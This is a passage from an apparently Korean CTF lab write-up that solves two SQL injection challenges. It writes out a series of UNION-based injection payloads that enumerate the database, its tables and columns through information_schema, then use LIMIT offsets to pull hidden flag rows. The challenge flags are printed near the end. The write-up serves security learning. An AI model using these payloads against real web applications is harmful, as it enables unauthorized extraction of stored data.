`Admin%' union select 1, 2, 3, DATABASE()#`를 입력하여 데이터베이스의 이름을 출력해 보았다.

![SQL Injection 1](/data/Penetration%20Testing%20|%20Week%206/44.png)

데이터베이스의 이름이 `sqli_1`인 것을 확인하였다.

<br>

**5. 테이블 이름 추출**

`Admin%' union select 1, 2, 3, table_name from information_schema.tables where table_schema = 'sqli_1'#`를 입력하여 `sqli_1` 데이터베이스 내의 테이블들을 출력해 보았다.

![SQL Injection 1](/data/Penetration%20Testing%20|%20Week%206/45.png)

`flag_table`, `plusFlag_table`, `user_info` 테이블이 존재하는 것을 확인하였다.

<br>

**6. 컬럼 이름 추출**

출력된 테이블명을 고려했을 때 `flag_table`에 플래그가 존재할 것으로 추측되므로, `Admin%' union select 1, 2, 3, column_name from information_schema.columns where table_name = 'flag_table'#`를 입력하여 `flag_table`의 컬럼명을 추출해 보았다. 

![SQL Injection 1](/data/Penetration%20Testing%20|%20Week%206/46.png)

`flag` 컬럼이 존재하는 것을 확인하였다.

<br>

**7. 데이터 추출**

최종적으로 `Admin%' union select 1, 2, 3, flag from flag_table#`를 입력하여 플래그를 획득하였다.

![SQL Injection 1](/data/Penetration%20Testing%20|%20Week%206/47.png)

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">Basic_Union_SQLi</span>}</span></p>

<br>

##### SQL Injection 2

<img src="/data/Penetration%20Testing%20%7C%20Week%206/48.png" alt="SQL Injection 2" style="padding: 0 200px; background-color: white">

링크의 주소로 접속하면 SQL Injection 1과 유사한 형태의 웹 페이지로 이동한다.

![SQL Injection 2](/data/Penetration%20Testing%20|%20Week%206/49.png)

예시 데이터들이 출력되는 대신 `normaltic`이라는 예시 검색어가 검색 란에 표시되어 있었다. 바로 검색을 수행해 보았다.

![SQL Injection 2](/data/Penetration%20Testing%20|%20Week%206/50.png)

아이디가 `normaltic`인 사용자 정보가 출력되었다. SQL Injection 공격이 가능한지 검토하기 위해 `normaltic' and '1' = '1`을 입력해 보았다.

![SQL Injection 2](/data/Penetration%20Testing%20|%20Week%206/51.png)

`Info` 컬럼에 아이디가 `normaltic`인 사용자의 정보가 정상적으로 출력되었으나, `ID` 컬럼에는 `normaltic`이 아닌 입력한 페이로드 문자열 전체가 그대로 표시되었다.

이 결과를 토대로 서버 측의 동작 방식을 다음과 같이 추측하였다.

1\. 서버는 내부적으로 `SELECT * FROM table_name WHERE ID = '____'`와 같은 형태의 쿼리를 사용한다.  
2\. 화면에 출력되는 `ID` 컬럼은 테이블의 실제 `ID` 컬럼 값이 아닌, 입력한 검색어 그대로를 표시한다.  
3\. `Level`과 `Rank Point` 컬럼의 값은 마스킹 처리되어 출력된다.  
4\. `Info` 컬럼에는 테이블의 실제 `Info` 컬럼에 저장된 값이 출력된다.

위와 같은 전제를 바탕으로, 데이터 추출을 위한 UNION SQL Injection을 수행하였다.

3단계까지의 절차를 수행한 결과 테이블은 총 6개의 컬럼으로 구성되어 있으며, `Info` 컬럼은 6번째 컬럼임을 확인하였다. 또한 테이블의 실제 데이터가 표시되는 것은 `Info` 컬럼뿐이라는 사실 역시 확인할 수 있었다. 이후 출력되는 6번째 컬럼을 활용해 데이터베이스와 테이블명, 컬럼명을 추출하였고, 각각 `sqli_5`, `flag_honey`, `flag`임을 확인하였다.

최종적으로 플래그를 출력하기 위해 `' union select 1, 2, 3, 4, 5, flag from flag_honey#`를 입력했을 때 문제에 직면했다.

![SQL Injection 2](/data/Penetration%20Testing%20|%20Week%206/52.png)

`flag` 컬럼의 값은 플래그가 아니었다. 그 이유에 대해서 고찰하던 중 위화감을 느꼈던 부분은, 바로 `sqli_5` 데이터베이스에 단 하나의 테이블(`flag_honey`)만이 존재하며 해당 테이블이 오직 하나의 컬럼(`flag`)과 하나의 레코드(`kkkkkkk_Not Here!`)로만 구성되었다는 사실이다. 이에 서버 측에서 의도적으로 하나의 행만 화면에 출력시키고 있다고 의심되었고, 이러한 가설을 검증해 보기 위해 `' union select 1, 2, 3, 4, 5, 6 union select 6, 5, 4, 3, 2, 1#`를 입력하여 2개 행을 출력하도록 유도해 보았다.

![SQL Injection 2](/data/Penetration%20Testing%20|%20Week%206/53.png)

예상대로 화면에는 하나의 행만 출력되었고, `Info` 컬럼의 값이 6인 점을 미루어 보아 쿼리가 반환하는 결과 집합의 첫 번째 행만이 출력되는 것으로 추측되었다. 이에 따라 다음과 같이 3가지 가능성을 고려하였다.

1\. 플래그는 `flag` 컬럼의 다른 레코드에 위치한다.  
2\. 플래그는 `flag_honey` 테이블의 다른 컬럼에 위치한다.  
3\. 플래그는 `sqli_5` 데이터베이스의 다른 테이블에 위치한다.

첫 번째 가능성부터 확인해보기 위해, `flag` 컬럼의 값이 `kkkkkkk_Not Here!`가 아닌 레코드의 출력을 시도하였다. 이를 위해 페이로드를 `' union select 1, 2, 3, 4, 5, flag from flag_honey limit 1, 1#`로 수정하여 검색해 보았다.

> **LIMIT**
>
> <strong>`LIMIT`</strong>는 SQL 쿼리 결과에서 반환할 레코드의 개수 혹은 범위를 제한할 때 사용되는 MySQL 키워드이다.  
> 주로 대량의 데이터 중 필요한 만큼만 조회하기 위해 사용되며, 기본적인 사용 방식은 다음과 같다.
>
> <pre><code class="language-sql hljs" data-highlighted="yes"><span class="hljs-comment">/* Syntax */</span>
> <span class="hljs-keyword">SELECT</span> column_name(s) <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">LIMIT</span> [offset], row_count;
>
> <span class="hljs-comment">/* Example */</span>
> <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">10</span>; <span class="hljs-comment">-- 상위 10개 행 반환</span>
> <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">5</span>, <span class="hljs-number">5</span>; <span class="hljs-comment">-- 6번째 행부터 5개 행 반환(offset 5, row_count 5)</span>
> </code></pre>

![SQL Injection 2](/data/Penetration%20Testing%20|%20Week%206/54.png)

위 쿼리의 반환 결과는 존재했으나, `Info` 컬럼에 데이터가 출력되지 않아 실질적인 활용이 불가능하였다. 따라서 이번에는 두 번째 가능성을 확인하기 위해 `' union select 1, 2, 3, 4, 5, column_name from information_schema.columns where table_name = 'flag_honey' limit 1, 1#`를 입력해 보았다.

![SQL Injection 2](/data/Penetration%20Testing%20|%20Week%206/55.png)

이번에도 데이터가 출력되지 않았다. 이에 따라 세 번째 가능성을 검토해 보기로 결정하였고, 페이로드를 `' union select 1, 2, 3, 4, 5, table_name from information_schema.tables where table_schema = 'sqli_5' limit 1, 1#`로 변경하여 입력해 보았다.

![SQL Injection 2](/data/Penetration%20Testing%20|%20Week%206/56.png)

그 결과 `sqli_5` 데이터베이스에 `game_user` 테이블이 있는 것을 확인하였다. 다만 해당 테이블은 사용자 정보 테이블로 보였고, 플래그와의 연관성은 낮다고 판단되었다. 따라서 추가 테이블이 존재할 가능성을 고려하여 다른 테이블을 계속해서 탐색해 보았다.

![SQL Injection 2](/data/Penetration%20Testing%20|%20Week%206/57.png)

`' union select 1, 2, 3, 4, 5, table_name from information_schema.tables where table_schema = 'sqli_5' limit 2, 1#`를 입력하여 `secret`이라는 테이블을 찾아냈다. 테이블 이름으로 보아 플래그가 저장되어 있을 가능성이 높다고 판단되었고, 바로 컬럼명을 조회해 보았다.

![SQL Injection 2](/data/Penetration%20Testing%20|%20Week%206/58.png)

`' union select 1, 2, 3, 4, 5, column_name from information_schema.columns where table_name = 'secret'#`를 입력하여 `secret` 테이블에도 `flag` 컬럼이 존재함을 확인하였다. 뒤이어 `flag` 컬럼의 값을 추출해 보았다.

![SQL Injection 2](/data/Penetration%20Testing%20|%20Week%206/59.png)

이번에도 플래그를 획득할 수 없었다. 따라서 `flag` 컬럼에 존재하는 다른 값이 있는지 확인해 보았다.

![SQL Injection 2](/data/Penetration%20Testing%20|%20Week%206/60.png)

`' union select 1, 2, 3, 4, 5, flag from secret limit 1, 1#`를 입력하여 마침내 플래그를 획득할 수 있었다.

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">UnionOnlyOneColumn</span>}</span></p>